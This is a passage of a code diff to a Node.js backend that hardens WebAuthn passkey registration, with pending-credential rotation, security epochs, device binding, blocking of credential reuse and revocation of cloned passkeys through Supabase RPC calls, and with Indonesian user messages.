+  return unique.length === 1 ? unique[0] : '';
 }
 
 async function diracPasskeyA2FFetchCustomerById(customerId) {
@@ -11551,15 +14359,26 @@ function diracPasskeyA2FOwnerMatches(row, owner) {
   return false;
 }
 
-async function diracPasskeyA2FListActivePasskeys(owner) {
-  const select = ['id', 'user_id', 'email', 'credential_id', 'credential_json', 'transports', 'sign_count', 'is_active', 'created_at', 'last_used_at'].join(',');
+async function diracPasskeyA2FListActivePasskeys(owner, freshAfterMutation = false) {
+  const select = (freshAfterMutation === true
+    ? ['id', 'user_id', 'email', 'credential_id', 'credential_json', 'transports', 'sign_count', 'is_active', 'rotation_state', 'rotation_id', 'credential_epoch', 'public_key_sha256', 'backup_eligible', 'backup_state', 'confirmed_at', 'activated_at', 'revoked_at', 'revoke_reason', 'created_at', 'updated_at', 'last_used_at']
+    : ['id', 'user_id', 'email', 'credential_id', 'credential_json', 'transports', 'sign_count', 'is_active', 'created_at', 'last_used_at']).join(',');
   const seen = new Set();
   const rows = [];
   const fetchRows = async (filter) => {
-    const path = '/rest/v1/domain_passkeys?select=' + encodeURIComponent(select) + '&is_active=eq.true&' + filter + '&order=created_at.desc&limit=20';
+    const path = '/rest/v1/domain_passkeys?select=' + encodeURIComponent(select)
+      + '&is_active=eq.true&' + filter
+      + (freshAfterMutation === true
+        ? '&rotation_state=eq.active&order=updated_at.desc,created_at.desc&limit=20'
+        : '&order=created_at.desc&limit=20');
     const result = await supabaseFetch(path, { method: 'GET', auth: 'service' });
-    if (!result.ok) return;
-    for (const row of (Array.isArray(result.data) ? result.data : [])) {
+    if (!result.ok || !Array.isArray(result.data)) {
+      const error = new Error('PASSKEY_ACTIVE_STATE_READ_FAILED');
+      error.code = 'PASSKEY_ACTIVE_STATE_READ_FAILED';
+      error.statusCode = 503;
+      throw error;
+    }
+    for (const row of result.data) {
       const key = String(row && (row.id || row.credential_id) || '');
       if (!key || seen.has(key) || !diracPasskeyA2FOwnerMatches(row, owner)) continue;
       seen.add(key);
@@ -11584,154 +14403,1229 @@ async function diracPasskeyA2FListActivePasskeys(owner) {
   return rows;
 }
 
-async function diracPasskeyA2FFetchByCredentialId(credentialId) {
+function diracPasskeyA2FActiveSetProof(rows) {
+  const credentialIds = Array.from(new Set((Array.isArray(rows) ? rows : [])
+    .filter((row) => row && row.is_active === true && row.credential_id)
+    .map((row) => String(row.credential_id))))
+    .sort();
+  return {
+    count: credentialIds.length,
+    hash: crypto.createHash('sha256').update(credentialIds.join('\n')).digest('hex')
+  };
+}
+
+async function diracPasskeyA2FReadSecurityEpoch(owner) {
+  if (!owner || !customerSecurityLooksLikeUuid(String(owner.customerId || ''))) {
+    const error = new Error('PASSKEY_SECURITY_OWNER_INVALID');
+    error.code = 'PASSKEY_SECURITY_OWNER_INVALID';
+    error.statusCode = 503;
+    throw error;
+  }
+  const path = '/rest/v1/security_customer_settings?select=' + encodeURIComponent('id,customer_id,security_epoch')
+    + '&customer_id=eq.' + encodeURIComponent(owner.customerId)
+    + '&order=created_at.desc&limit=2';
+  const result = await supabaseFetch(path, { method: 'GET', auth: 'service' });
+  if (!result.ok || !Array.isArray(result.data) || result.data.length > 1) {
+    const error = new Error('PASSKEY_SECURITY_EPOCH_READ_FAILED');
+    error.code = 'PASSKEY_SECURITY_EPOCH_READ_FAILED';
+    error.statusCode = 503;
+    throw error;
+  }
+  if (result.data.length === 0) return 0;
+  const epoch = Number(result.data[0] && result.data[0].security_epoch || 0);
+  if (!Number.isSafeInteger(epoch) || epoch < 1) {
+    const error = new Error('PASSKEY_SECURITY_EPOCH_INVALID');
+    error.code = 'PASSKEY_SECURITY_EPOCH_INVALID';
+    error.statusCode = 503;
+    throw error;
+  }
+  return epoch;
+}
+
+async function diracPasskeyA2FEnsureInitialSecurityEpoch(owner) {
+  const customerId = String(owner && owner.customerId || '').trim();
+  if (!customerSecurityLooksLikeUuid(customerId)) {
+    const error = new Error('PASSKEY_INITIAL_SECURITY_EPOCH_OWNER_INVALID');
+    error.code = 'PASSKEY_INITIAL_SECURITY_EPOCH_OWNER_INVALID';
+    error.statusCode = 503;
+    throw error;
+  }
+
+  const select = encodeURIComponent('id,customer_id,security_epoch');
+  const readState = async (freshAfterCreate) => {
+    const path = '/rest/v1/security_customer_settings?select=' + select
+      + '&customer_id=eq.' + encodeURIComponent(customerId)
+      + (freshAfterCreate === true
+        ? '&id=not.is.null&order=created_at.asc&limit=2'
+        : '&order=created_at.desc&limit=2');
+    const result = await supabaseFetch(path, { method: 'GET', auth: 'service' });
+    if (!result.ok || !Array.isArray(result.data) || result.data.length > 1) {
+      const error = new Error('PASSKEY_INITIAL_SECURITY_EPOCH_READ_FAILED');
+      error.code = 'PASSKEY_INITIAL_SECURITY_EPOCH_READ_FAILED';
+      error.statusCode = 503;
+      throw error;
+    }
+    if (result.data.length === 0) return { exists: false, epoch: 0 };
+    const row = result.data[0];
+    const epoch = Number(row && row.security_epoch || 0);
+    if (!row || String(row.customer_id || '') !== customerId
+        || !Number.isSafeInteger(epoch) || epoch < 1) {
+      const error = new Error('PASSKEY_INITIAL_SECURITY_EPOCH_INVALID');
+      error.code = 'PASSKEY_INITIAL_SECURITY_EPOCH_INVALID';
+      error.statusCode = 503;
+      throw error;
+    }
+    return { exists: true, epoch };
+  };
+
+  const before = await readState(false);
+  if (before.exists) return before.epoch;
+
+  const created = await supabaseFetch('/rest/v1/security_customer_settings', {
+    method: 'POST',
+    auth: 'service',
+    prefer: 'return=minimal',
+    body: [{ customer_id: customerId }]
+  });
+
+  const after = await readState(true);
+  if (after.exists && after.epoch === 1) return 1;
+
+  const error = new Error('PASSKEY_INITIAL_SECURITY_EPOCH_BOOTSTRAP_FAILED');
+  error.code = 'PASSKEY_INITIAL_SECURITY_EPOCH_BOOTSTRAP_FAILED';
+  error.statusCode = Number(created && created.status || 503) || 503;
+  throw error;
+}
+
+async function diracPasskeyA2FFetchByCredentialId(credentialId, owner, readbackAfterInsert = false) {
   const id = diracPasskeyA2FSafeString(credentialId, 4096);
-  if (!id) return { ok: true, data: [] };
+  const ownerCustomerId = String(owner && owner.customerId || '').trim();
+  if (!id || !customerSecurityLooksLikeUuid(ownerCustomerId)) return { ok: true, data: [] };
   const select = ['id', 'user_id', 'email', 'credential_id', 'credential_json', 'transports', 'sign_count', 'is_active', 'created_at', 'last_used_at'].join(',');
-  const path = '/rest/v1/domain_passkeys?select=' + encodeURIComponent(select) + '&credential_id=eq.' + encodeURIComponent(id) + '&limit=1';
+  const path = '/rest/v1/domain_passkeys?select=' + encodeURIComponent(select)
+    + '&credential_id=eq.' + encodeURIComponent(id)
+    + '&user_id=eq.' + encodeURIComponent(ownerCustomerId)
+    + (readbackAfterInsert === true
+      ? '&is_active=eq.true&order=created_at.desc&limit=2'
+      : '&limit=1');
   return supabaseFetch(path, { method: 'GET', auth: 'service' });
 }
 
-async function diracPasskeyA2FSaveRegistration({ owner, credential, response, clientData, payload, req }) {
+
+const DIRAC_PASSKEY_ROTATION_PURPOSE_INITIAL_V237 = 'initial';
+const DIRAC_PASSKEY_ROTATION_PURPOSE_REPLACE_V237 = 'replace';
+const DIRAC_PASSKEY_ROTATION_PURPOSE_RECOVERY_V237 = 'recovery';
+const DIRAC_PASSKEY_ASSERTION_PURPOSE_V237 = 'login';
+const DIRAC_PASSKEY_ASSERTION_PURPOSE_CONFIRM_PENDING_V237 = 'confirm_pending';
+const DIRAC_PASSKEY_PENDING_TTL_MS_V237 = 5 * 60 * 1000;
+const DIRAC_PASSKEY_RPC_NAMES_V237 = new Set([
+  'dirac_passkey_create_pending_v237',
+  'dirac_passkey_finalize_rotation_v237',
+  'dirac_passkey_record_assertion_v237',
+  'dirac_passkey_revoke_clone_v237'
+]);
+
+function diracPasskeyA2FPublicKeySha256V237(registration) {
+  const encoded = String(registration && registration.credentialPublicKeyCose || '');
+  if (!/^[A-Za-z0-9_-]{16,8192}$/.test(encoded)) return '';
+  let raw;
+  try { raw = diracPasskeyA2FBase64UrlToBuffer(encoded); } catch (_) { raw = Buffer.alloc(0); }
+  if (!raw.length || raw.toString('base64url') !== encoded) return '';
+  return crypto.createHash('sha256').update(raw).digest('hex');
+}
+
+async function diracPasskeyA2FRpcV237(name, body) {
+  const rpcName = String(name || '');
+  if (!DIRAC_PASSKEY_RPC_NAMES_V237.has(rpcName)
+      || !body || typeof body !== 'object' || Array.isArray(body)) {
+    return { ok: false, status: 500, data: { code: 'PASSKEY_RPC_CONTRACT_INVALID' } };
+  }
+  return supabaseFetch('/rest/v1/rpc/' + rpcName, {
+    method: 'POST',
+    auth: 'service',
+    prefer: 'return=representation',
+    body
+  });
+}
+
+function diracPasskeyA2FRpcProviderCodeV237(result) {
+  return String(result && result.data && (
+    result.data.message || result.data.error || result.data.code || result.data.error_code
+  ) || '').slice(0, 160);
+}
+
+function diracPasskeyA2FRpcDataObjectV237(result) {
+  const data = result && result.data;
+  if (data && typeof data === 'object' && !Array.isArray(data)) return data;
+  if (Array.isArray(data) && data.length === 1
+      && data[0] && typeof data[0] === 'object' && !Array.isArray(data[0])) return data[0];
+  return null;
+}
+
+async function diracPasskeyA2FFetchCredentialStateV237({ owner, credentialId, rotationId = '', passkeyId = '', activeOnly = false }) {
+  const customerId = String(owner && owner.customerId || '').trim();
+  const id = diracPasskeyA2FSafeString(credentialId, 4096);
+  const rotation = String(rotationId || '').trim();
+  const rowId = String(passkeyId || '').trim();
+  if (!customerSecurityLooksLikeUuid(customerId) || !id) return { ok: false, status: 400, data: [] };
+  if (rotation && !customerSecurityLooksLikeUuid(rotation)) return { ok: false, status: 400, data: [] };
+  if (rowId && !customerSecurityLooksLikeUuid(rowId)) return { ok: false, status: 400, data: [] };
+  const select = [
+    'id', 'user_id', 'email', 'credential_id', 'credential_json', 'transports',
+    'sign_count', 'backup_eligible', 'backup_state', 'public_key_sha256', 'rotation_id',
+    'rotation_state', 'rotation_purpose', 'credential_epoch', 'expected_security_epoch',
+    'authorizing_credential_id_hash', 'current_auth_session_id', 'recovery_request_id',
+    'recovery_session_id', 'recovery_session_hash', 'is_active', 'pending_expires_at',
+    'confirmed_at', 'activated_at', 'revoked_at', 'revoke_reason', 'created_at', 'updated_at', 'last_used_at'
+  ].join(',');
+  let path = '/rest/v1/domain_passkeys?select=' + encodeURIComponent(select)
+    + '&user_id=eq.' + encodeURIComponent(customerId)
+    + '&credential_id=eq.' + encodeURIComponent(id);
+  if (rotation) path += '&rotation_id=eq.' + encodeURIComponent(rotation);
+  if (rowId) path += '&id=eq.' + encodeURIComponent(rowId);
+  if (activeOnly === true) path += '&is_active=eq.true&rotation_state=eq.active';
+  path += '&order=updated_at.desc,created_at.desc&limit=2';
+  return supabaseFetch(path, { method: 'GET', auth: 'service' });
+}
+
+function diracPasskeyA2FExpectedEpochV237(payload) {
+  const epoch = Number(payload && payload.securityEpochAtStart);
+  return Number.isSafeInteger(epoch) && epoch >= 0 ? epoch : -1;
+}
+
+function diracPasskeyA2FRotationPurposeV237(payload) {
+  if (!payload || String(payload.mode || '').toLowerCase() !== 'registration') return '';
+  const declared = String(payload.rotationPurpose || '').toLowerCase();
+  const activeCount = Number(payload.activeCredentialCountAtStart);
+  if (!Number.isSafeInteger(activeCount) || activeCount < 0) return '';
+  const hasRecovery = Boolean(payload.lostPasskeyRecovery && typeof payload.lostPasskeyRecovery === 'object');
+  let expected = '';
+  if (hasRecovery) {
+    if (activeCount < 1) return '';
+    expected = DIRAC_PASSKEY_ROTATION_PURPOSE_RECOVERY_V237;
+  } else if (activeCount === 0) {
+    expected = DIRAC_PASSKEY_ROTATION_PURPOSE_INITIAL_V237;
+  } else if (activeCount === 1) {
+    expected = DIRAC_PASSKEY_ROTATION_PURPOSE_REPLACE_V237;
+  } else {
+    return '';
+  }
+  return declared && safeEqual(declared, expected) ? expected : '';
+}
+
+function diracPasskeyA2FCurrentSessionRequiredV237(req, owner) {
+  const id = diracPasskeyA2FCurrentAuthSessionIdV235(req, owner);
+  return customerSecurityLooksLikeUuid(id) ? id : '';
+}
+
+async function diracPasskeyA2FCreatePendingConfirmationV237({ owner, pendingRow, payload, req, deviceBindingKeyId }) {
+  const nowMs = Date.now();
+  const customerId = String(owner && owner.customerId || '');
+  const authUserId = String(owner && owner.authUserId || '');
+  const credentialId = String(pendingRow && pendingRow.credential_id || '');
+  const passkeyId = String(pendingRow && pendingRow.id || '');
+  const rotationId = String(pendingRow && pendingRow.rotation_id || '');
+  const rotationPurpose = String(pendingRow && pendingRow.rotation_purpose || '');
+  const currentAuthSessionId = String(pendingRow && pendingRow.current_auth_session_id || '');
+  const expectedSecurityEpoch = Number(pendingRow && pendingRow.expected_security_epoch);
+  const previousSignCount = Number(pendingRow && pendingRow.sign_count);
+  const pendingExpiresAtMs = Date.parse(String(pendingRow && pendingRow.pending_expires_at || ''));
+  const originalExpectedEpoch = diracPasskeyA2FExpectedEpochV237(payload);
+  const originalSetCount = Number(payload && payload.activeCredentialCountAtStart);
+  const originalSetHash = String(payload && payload.activeCredentialSetHashAtStart || '');
+  const storedBinding = diracPasskeyA2FStoredDeviceBinding(pendingRow);
+  const publicKeySha256 = String(pendingRow && pendingRow.public_key_sha256 || '');
+
+  if (!customerSecurityLooksLikeUuid(customerId)
+      || !customerSecurityLooksLikeUuid(authUserId)
+      || !customerSecurityLooksLikeUuid(passkeyId)
+      || !customerSecurityLooksLikeUuid(rotationId)
+      || !customerSecurityLooksLikeUuid(currentAuthSessionId)
+      || !/^[A-Za-z0-9_-]{16,4096}$/.test(credentialId)
+      || !['initial', 'replace', 'recovery'].includes(rotationPurpose)
+      || !Number.isSafeInteger(expectedSecurityEpoch) || expectedSecurityEpoch < 1
+      || expectedSecurityEpoch !== originalExpectedEpoch
+      || !Number.isSafeInteger(previousSignCount) || previousSignCount < 0
+      || !Number.isSafeInteger(originalSetCount) || originalSetCount < 0
+      || !/^[a-f0-9]{64}$/.test(originalSetHash)
+      || !Number.isFinite(pendingExpiresAtMs) || pendingExpiresAtMs <= nowMs + 1000
+      || !/^[a-f0-9]{64}$/.test(publicKeySha256)
+      || !storedBinding.ok
+      || !/^[a-f0-9]{64}$/.test(String(deviceBindingKeyId || ''))
+      || !safeEqual(storedBinding.keyId, String(deviceBindingKeyId))) {
+    return { ok: false, status: 503, code: 'PASSKEY_CONFIRMATION_CHALLENGE_CONTEXT_INVALID' };
+  }
+
+  const expiresAtMs = Math.min(pendingExpiresAtMs, nowMs + DIRAC_PASSKEY_A2F_TTL_MS);
+  if (expiresAtMs <= nowMs + 1000) {
+    return { ok: false, status: 409, code: 'PASSKEY_CONFIRMATION_CHALLENGE_EXPIRED' };
+  }
+
+  const challenge = crypto.randomBytes(32).toString('base64url');
+  const jti = crypto.randomBytes(32).toString('base64url');
+  const confirmationPayload = {
+    type: DIRAC_PASSKEY_A2F_TOKEN_TYPE,
+    method: 'passkey',
+    mode: 'confirm_pending',
+    assertionPurpose: DIRAC_PASSKEY_ASSERTION_PURPOSE_CONFIRM_PENDING_V237,
+    jti,
+    challenge,
+    rpId: String(payload && payload.rpId || diracPasskeyA2FRpId(req)),
+    origin: String(payload && payload.origin || requestOrigin(req)),
+    authUserId,
+    customerId,
+    emailHash: customerMfaProfileId(owner.email),
+    uaHash: customerMfaBindingHash('ua', requestUserAgent(req)),
+    securityEpochAtStart: expectedSecurityEpoch,
+    activeCredentialCountAtStart: originalSetCount,
+    activeCredentialSetHashAtStart: originalSetHash,
+    pendingPasskeyId: passkeyId,
+    pendingCredentialId: credentialId,
+    pendingCredentialIdHash: crypto.createHash('sha256').update(credentialId).digest('hex'),
+    previousSignCount,
+    rotationId,
+    rotationPurpose,
+    currentAuthSessionId,
+    publicKeySha256,
+    deviceBindingKeyId: storedBinding.keyId,
+    pendingExpiresAtMs,
+    lostPasskeyRecovery: payload && payload.lostPasskeyRecovery && typeof payload.lostPasskeyRecovery === 'object'
+      ? {
+          requestId: String(payload.lostPasskeyRecovery.requestId || ''),
+          sessionId: String(payload.lostPasskeyRecovery.sessionId || ''),
+          sessionHash: String(payload.lostPasskeyRecovery.sessionHash || '')
+        }
+      : undefined,
+    issuedAtMs: nowMs,
+    expiresAtMs
+  };
+  const setupToken = diracPasskeyA2FEncodeToken(confirmationPayload);
+  await diracPasskeyA2FStoreChallenge(setupToken, confirmationPayload);
+
+  return {
+    ok: true,
+    confirmationResponse: {
+      ok: true,
+      verified: false,
+      active: false,
+      method: 'passkey',
+      passkeyMode: 'confirm_pending',
+      confirmation_required: true,
+      needsRegistration: false,
+      database_saved: true,
+      pending_created: true,
+      registered_now: false,
+      device_binding_required: true,
+      device_binding_policy: 'webcrypto-nonextractable-v1',
+      setupToken,
+      mfaSetupToken: setupToken,
+      expires_in: Math.max(1, Math.floor((expiresAtMs - nowMs) / 1000)),
+      publicKey: {
+        challenge,
+        rpId: confirmationPayload.rpId,
+        timeout: Math.max(1000, Math.min(60000, expiresAtMs - nowMs)),
+        userVerification: 'required',
+        allowCredentials: [{
+          type: 'public-key',
+          id: credentialId,
+          transports: Array.isArray(pendingRow.transports) ? pendingRow.transports : []
+        }]
+      },
+      credential_id_hint: confirmationPayload.pendingCredentialIdHash.slice(0, 12),
+      message: 'Passkey pending tersimpan. Konfirmasikan Passkey baru sekali lagi sebelum aktivasi.'
+    }
+  };
+}
+
+async function diracPasskeyA2FRevokeCloneV237({ row, owner, assertion, req }) {
+  const currentSessionId = diracPasskeyA2FCurrentSessionRequiredV237(req, owner);
+  const previousSignCount = Number(assertion && assertion.previousSignCount);
+  if (!row || !customerSecurityLooksLikeUuid(String(row.id || ''))
+      || !owner || !customerSecurityLooksLikeUuid(String(owner.customerId || ''))
+      || !customerSecurityLooksLikeUuid(String(owner.authUserId || ''))
+      || !currentSessionId
+      || !Number.isSafeInteger(previousSignCount) || previousSignCount < 0) {
+    return { ok: false, status: 503, code: 'PASSKEY_CLONE_REVOCATION_CONTEXT_INVALID' };
+  }
+  const revoked = await diracPasskeyA2FRpcV237('dirac_passkey_revoke_clone_v237', {
+    p_customer_id: String(owner.customerId),
+    p_auth_user_id: String(owner.authUserId),
+    p_passkey_id: String(row.id),
+    p_expected_sign_count: previousSignCount,
+    p_reason: 'passkey_sign_count_replay'
+  });
+  if (!revoked.ok) {
+    console.error('[passkey-clone-revoke-rpc-failed]', {
+      status: Number(revoked.status || 0),
+      provider_code: diracPasskeyA2FRpcProviderCodeV237(revoked)
+    });
+    return { ok: false, status: revoked.status || 503, code: 'PASSKEY_CLONE_REVOCATION_FAILED' };
+  }
+  const readback = await diracPasskeyA2FFetchCredentialStateV237({
+    owner,
+    credentialId: String(row.credential_id || ''),
+    passkeyId: String(row.id)
+  });
+  const rows = readback.ok && Array.isArray(readback.data) ? readback.data : [];
+  const revokedRow = rows.length === 1 ? rows[0] : null;
+  if (!revokedRow || revokedRow.is_active !== false
+      || String(revokedRow.rotation_state || '') !== 'revoked'
+      || !revokedRow.revoked_at
+      || !diracPasskeyA2FOwnerMatches(revokedRow, owner)) {
+    return { ok: false, status: 503, code: 'PASSKEY_CLONE_REVOCATION_POSTCONDITION_FAILED' };
+  }
+  return { ok: true, status: 403, row: revokedRow };
+}
+
+async function diracPasskeyA2FSaveRegistration({ owner, credential, response, clientData, payload, req, body, setupToken }) {
   const credentialId = diracPasskeyA2FCredentialId(credential);
   if (!credentialId) return { ok: false, status: 400, message: 'Credential Passkey kosong. Coba ulangi.' };
-  if (!owner || !owner.customerId || !customerSecurityLooksLikeUuid(owner.customerId)) {
-    return { ok: false, status: 409, message: 'Customer owner Passkey tidak valid. Login ulang dulu.' };
+  if (!owner || !customerSecurityLooksLikeUuid(String(owner.customerId || ''))
+      || !customerSecurityLooksLikeUuid(String(owner.authUserId || ''))
+      || !isValidAuthEmail(owner.email)) {
+    return { ok: false, status: 409, message: 'Owner Passkey tidak valid. Login ulang dulu.', code: 'PASSKEY_OWNER_INVALID' };
   }
   const registration = diracPasskeyA2FValidateRegistrationResponse({ credential, response, payload, clientData, req });
   if (!registration.ok) {
-    return { ok: false, status: 403, message: 'Attestation Passkey tidak valid.', code: registration.reason || 'PASSKEY_ATTESTATION_INVALID' };
+    return {
+      ok: false,
+      status: 403,
+      message: registration.reason === 'passkey_backup_flags_invalid'
+        ? 'Flag backup Passkey tidak valid.'
+        : 'Attestation Passkey tidak valid.',
+      code: registration.reason || 'PASSKEY_ATTESTATION_INVALID'
+    };
+  }
+  const deviceBinding = diracPasskeyA2FValidateRegistrationDeviceBinding({ body, setupToken, payload, credentialId });
+  if (!deviceBinding.ok) {
+    return {
+      ok: false,
+      status: 403,
+      message: 'Binding perangkat tidak valid. Passkey tidak disimpan.',
+      code: String(deviceBinding.reason || 'DEVICE_BINDING_REGISTRATION_INVALID').toUpperCase()
+    };
   }
 
-  const nowIso = new Date().toISOString();
+  const expectedSecurityEpoch = diracPasskeyA2FExpectedEpochV237(payload);
+  const rotationPurpose = diracPasskeyA2FRotationPurposeV237(payload);
+  const currentAuthSessionId = diracPasskeyA2FCurrentSessionRequiredV237(req, owner);
+  const publicKeySha256 = diracPasskeyA2FPublicKeySha256V237(registration);
+  if (expectedSecurityEpoch < 0 || !rotationPurpose || !currentAuthSessionId || !/^[a-f0-9]{64}$/.test(publicKeySha256)) {
+    return {
+      ok: false,
+      status: 503,
+      message: 'Konteks transaksi Passkey tidak dapat dibuktikan. Login ulang lalu mulai ulang.',
+      code: 'PASSKEY_V237_TRANSACTION_CONTEXT_INVALID'
+    };
+  }
+
+  const nowMs = Date.now();
+  const nowIso = new Date(nowMs).toISOString();
+  const challengeExpiresAt = Number(payload && payload.expiresAtMs || 0);
+  const pendingExpiresAtMs = Math.min(
+    Number.isFinite(challengeExpiresAt) && challengeExpiresAt > nowMs ? challengeExpiresAt : nowMs + DIRAC_PASSKEY_PENDING_TTL_MS_V237,
+    nowMs + DIRAC_PASSKEY_PENDING_TTL_MS_V237
+  );
+  if (pendingExpiresAtMs <= nowMs + 1000) {
+    return { ok: false, status: 409, message: 'Challenge Passkey hampir kedaluwarsa. Mulai ulang proses.', code: 'PASSKEY_PENDING_EXPIRY_INVALID' };
+  }
+
   const signCount = Math.max(0, Number(registration.signCount || diracPasskeyA2FSignCount(response) || 0));
+  if (!Number.isSafeInteger(signCount)) {
+    return { ok: false, status: 400, message: 'Counter Passkey tidak valid.', code: 'PASSKEY_SIGN_COUNT_INVALID' };
+  }
   const credentialJson = diracPasskeyA2FMinimalCredentialJson({ credential, response, clientData, payload, owner, req, mode: 'registration' });
   credentialJson.webauthn = {
     rp_id: String(payload && payload.rpId || diracPasskeyA2FRpId(req)),
     public_key_jwk: registration.publicKeyJwk,
     credential_public_key_cose: registration.credentialPublicKeyCose,
     aaguid: registration.aaguid,
+    rotation_version: 'dirac-passkey-single-active-rotation-v237',
     sign_count: signCount,
+    backup_eligible: registration.backupEligible === true,
+    backup_state: registration.backupState === true,
+    device_bound: registration.deviceBound === true,
+    sync_policy: 'synced-passkey-device-binding-required-v1',
     verified_at: nowIso
   };
-  const rowBody = {
-    user_id: owner.customerId,
-    email: owner.email,
-    credential_id: credentialId,
-    credential_json: credentialJson,
-    transports: diracPasskeyA2FTransports(credential, response),
-    sign_count: signCount,
-    is_active: true,
-    updated_at: nowIso
+  credentialJson.device_binding = {
+    version: DIRAC_PASSKEY_DEVICE_BINDING_VERSION,
+    algorithm: DIRAC_PASSKEY_DEVICE_BINDING_ALGORITHM,
+    required: true,
+    key_id: deviceBinding.keyId,
+    public_key_jwk: deviceBinding.publicKeyJwk,
+    registered_at: nowIso,
+    last_verified_at: nowIso
   };
 
-  const existingResult = await diracPasskeyA2FFetchByCredentialId(credentialId);
+  const recovery = payload && payload.lostPasskeyRecovery && typeof payload.lostPasskeyRecovery === 'object'
+    ? payload.lostPasskeyRecovery
+    : null;
+  let recoveryRequestId = null;
+  let recoverySessionId = null;
+  let recoverySessionHash = null;
+  if (recovery) {
+    recoveryRequestId = String(recovery.requestId || '');
+    recoverySessionId = String(recovery.sessionId || '');
+    recoverySessionHash = String(recovery.sessionHash || '').toLowerCase();
+    if (!customerSecurityLooksLikeUuid(recoverySessionId)
+        || !/^[A-Za-z0-9_.:-]{8,128}$/.test(recoveryRequestId)
+        || !/^[a-f0-9]{64}$/.test(recoverySessionHash)
+        || !Number.isSafeInteger(Number(payload.issuedAtMs || 0))) {
+      return {
+        ok: false,
+        status: 403,
+        message: 'Binding sesi recovery tidak valid. Login ulang lalu mulai ulang lost Passkey.',
+        code: 'LOST_PASSKEY_ROTATION_BINDING_INVALID'
+      };
+    }
+    credentialJson.lost_passkey_rotation_v235 = {
+      version: 'dirac-lost-passkey-rotation-v235',
+      request_id: recoveryRequestId,
+      recovery_session_id: recoverySessionId,
+      recovery_session_hash: recoverySessionHash,
+      auth_user_id: String(owner.authUserId),
+      current_auth_session_id: currentAuthSessionId,
+      issued_at_ms: Number(payload.issuedAtMs)
+    };
+  }
+
+  const existingResult = await diracPasskeyA2FFetchByCredentialId(credentialId, owner);
   if (!existingResult.ok) {
     return { ok: false, status: existingResult.status || 500, message: 'Gagal mengecek credential Passkey di database.' };
   }
-
-  const existing = Array.isArray(existingResult.data) && existingResult.data[0] ? existingResult.data[0] : null;
-  if (existing && !diracPasskeyA2FOwnerMatches(existing, owner)) {
-    return { ok: false, status: 409, message: 'Credential Passkey sudah terdaftar pada akun lain.' };
+  const existingRows = Array.isArray(existingResult.data) ? existingResult.data : [];
+  if (existingRows.length > 0) {
+    return {
+      ok: false,
+      status: 409,
+      message: 'Credential lama tidak boleh didaftarkan ulang. Buat Passkey pengganti yang benar-benar baru.',
+      code: 'PASSKEY_CREDENTIAL_REUSE_FORBIDDEN'
+    };
   }
 
-  if (existing && existing.id) {
-    const patch = await supabaseFetch('/rest/v1/domain_passkeys?id=eq.' + encodeURIComponent(existing.id), {
-      method: 'PATCH',
-      auth: 'service',
-      prefer: 'return=representation',
-      body: rowBody
-    });
-    if (!patch.ok) {
-      console.error('[passkey-update-failed]', customerSecuritySafeLogError(patch.data));
-      return { ok: false, status: patch.status || 500, message: 'Gagal memperbarui Passkey di database.', code: 'PASSKEY_UPDATE_FAILED' };
-    }
-    return { ok: true, created: false, row: Array.isArray(patch.data) ? patch.data[0] : patch.data };
-  }
-
-  const created = await supabaseFetch('/rest/v1/domain_passkeys', {
-    method: 'POST',
-    auth: 'service',
-    prefer: 'return=representation',
-    body: [rowBody]
+  const rotationId = crypto.randomUUID();
+  const transports = diracPasskeyA2FTransports(credential, response);
+  const created = await diracPasskeyA2FRpcV237('dirac_passkey_create_pending_v237', {
+    p_customer_id: String(owner.customerId),
+    p_auth_user_id: String(owner.authUserId),
+    p_email: String(owner.email),
+    p_credential_id: credentialId,
+    p_credential_json: credentialJson,
+    p_transports: transports,
+    p_sign_count: signCount,
+    p_backup_eligible: registration.backupEligible === true,
+    p_backup_state: registration.backupState === true,
+    p_rotation_id: rotationId,
+    p_rotation_purpose: rotationPurpose,
+    p_expected_security_epoch: expectedSecurityEpoch,
+    p_authorizing_credential_id_hash: null,
+    p_current_auth_session_id: currentAuthSessionId,
+    p_recovery_request_id: recoveryRequestId,
+    p_recovery_session_id: recoverySessionId,
+    p_recovery_session_hash: recoverySessionHash,
+    p_public_key_sha256: publicKeySha256,
+    p_pending_expires_at: new Date(pendingExpiresAtMs).toISOString()
   });
   if (!created.ok) {
-    console.error('[passkey-create-failed]', customerSecuritySafeLogError(created.data));
-    return { ok: false, status: created.status || 500, message: 'Gagal menyimpan Passkey ke database.', code: 'PASSKEY_CREATE_FAILED' };
+    console.error('[passkey-create-pending-rpc-failed]', {
+      status: Number(created.status || 0),
+      provider_code: diracPasskeyA2FRpcProviderCodeV237(created)
+    });
+    return { ok: false, status: created.status || 500, message: 'Gagal membuat Passkey pending secara atomik.', code: 'PASSKEY_CREATE_PENDING_RPC_FAILED' };
   }
-  return { ok: true, created: true, row: Array.isArray(created.data) ? created.data[0] : created.data };
+
+  const createdData = diracPasskeyA2FRpcDataObjectV237(created);
+  if (!createdData || createdData.ok !== true
+      || !customerSecurityLooksLikeUuid(String(createdData.passkey_id || ''))
+      || !safeEqual(String(createdData.rotation_id || ''), rotationId)
+      || String(createdData.rotation_state || '') !== 'pending') {
+    return { ok: false, status: 503, message: 'Bukti hasil RPC Passkey pending tidak valid.', code: 'PASSKEY_CREATE_PENDING_RPC_POSTCONDITION_FAILED' };
+  }
+
+  const pendingReadback = await diracPasskeyA2FFetchCredentialStateV237({
+    owner,
+    credentialId,
+    rotationId,
+    passkeyId: String(createdData.passkey_id)
+  });
+  const pendingRows = pendingReadback.ok && Array.isArray(pendingReadback.data) ? pendingReadback.data : [];
+  const pendingRow = pendingRows.length === 1 ? pendingRows[0] : null;
+  const pendingExpiryReadbackMs = Date.parse(String(pendingRow && pendingRow.pending_expires_at || ''));
+  const storedBinding = diracPasskeyA2FStoredDeviceBinding(pendingRow);
+  if (!pendingRow || !customerSecurityLooksLikeUuid(String(pendingRow.id || ''))
+      || !safeEqual(String(pendingRow.id || ''), String(createdData.passkey_id || ''))
+      || !safeEqual(String(pendingRow.credential_id || ''), credentialId)
+      || pendingRow.is_active !== false
+      || String(pendingRow.rotation_state || '') !== 'pending'
+      || String(pendingRow.rotation_purpose || '') !== rotationPurpose
+      || pendingRow.credential_epoch == null || Number(pendingRow.credential_epoch) !== 0
+      || Number(pendingRow.expected_security_epoch || 0) !== expectedSecurityEpoch
+      || !safeEqual(String(pendingRow.rotation_id || ''), rotationId)
+      || !safeEqual(String(pendingRow.current_auth_session_id || ''), currentAuthSessionId)
+      || !safeEqual(String(pendingRow.public_key_sha256 || ''), publicKeySha256)
+      || Number(pendingRow.sign_count || 0) !== signCount
+      || pendingRow.backup_eligible !== (registration.backupEligible === true)
